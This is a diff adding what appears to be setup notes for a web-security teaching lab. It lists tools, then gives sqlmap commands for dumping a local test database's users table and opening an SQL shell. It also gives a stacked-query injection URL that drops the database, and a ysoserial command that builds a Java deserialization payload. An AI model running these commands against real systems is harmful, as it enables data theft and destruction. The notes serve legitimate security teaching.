@@ -1,0 +1,56 @@
+Intellij
+	* Grep Console
+		* settings
+	* Lombok
+	* Emmet Everywhere
+python 2.7
+	* sqlmap
+mysql
+glassfish
+java 11
+java 1.8 + src
+maven update
+Navicat
+
+==========================================================================================
+                                        SQLMap
+==========================================================================================
+
+1) Install Python 2.7
+
+2) Run "pip install sqlmap"
+
+3) Use sqlmap:
+
+sqlmap -u "http://localhost:8080/login.do?username=x&password=y"
+sqlmap -u "http://localhost:8080/login.do?username=x&password=y" --dbs
+sqlmap -u "http://localhost:8080/login.do?username=x&password=y" --tables -D testdb
+sqlmap -u "http://localhost:8080/login.do?username=x&password=y" --columns -D testdb -T users
+sqlmap -u "http://localhost:8080/login.do?username=x&password=y" --dump -D testdb -T users
+
+# Query whatever you want!
+sqlmap -u "http://localhost:8080/login.do?username=sadeq&password=a" --sql-shell
+
+# The following command results in WARNING:
+#     execution of non-query SQL statements is only available when stacked queries are supported
+sqlmap -u "http://localhost:8080/pwd.do?password=1&username=kambiz" --sql-query="DROP DATABASE testdb"
+
+# A net search shows sqlmap thinks only "PostgreSQL" and "SQL Server" support ``stacked queries''.
+# However, MySQL Connector/J does support this with "allowMultiQueries=true" in the connection string
+# See: https://dousti.page.link/connectorj-ref
+
+# In Java, one can achieve this result via "statement.addBatch(query)" and "statement.executeBatch()".
+# See: https://viralpatel.net/blogs/batch-insert-in-java-jdbc/
+# PHP's MySQLi (MySQL Improved) extension supports this using mysqli_multi_query()
+
+# Try: change the connection string for "MySQLPool_root" to:
+jdbc:mysql://localhost:3306/testdb?allowPublicKeyRetrieval=true&useSSL=false&allowMultiQueries=true
+
+# Then, visit the following URL:
+http://localhost:8080/pwd.do?username='; DROP DATABASE testdb; -- &password=1
+
+
+==========================================================================================
+                                        Y So Serial?
+==========================================================================================
+java -jar ysoserial-v0.0.5.jar CommonsCollections5 notepad.exe > malicious.ser
